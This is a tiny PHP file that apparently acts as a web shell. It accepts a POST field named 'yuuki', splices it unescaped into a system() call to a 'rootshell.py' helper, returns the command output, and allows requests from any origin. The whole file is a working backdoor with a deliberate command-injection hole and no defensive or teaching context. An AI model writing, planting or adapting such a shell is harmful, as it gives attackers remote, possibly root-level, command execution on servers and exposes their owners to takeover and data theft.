<?php
header('Access-Control-Allow-Origin: *');
if($_POST) {
  $send_cmd = system('python rootshell.py "' . $_POST["yuuki"] . '" 2>&1');
  echo($send_cmd);
}
?>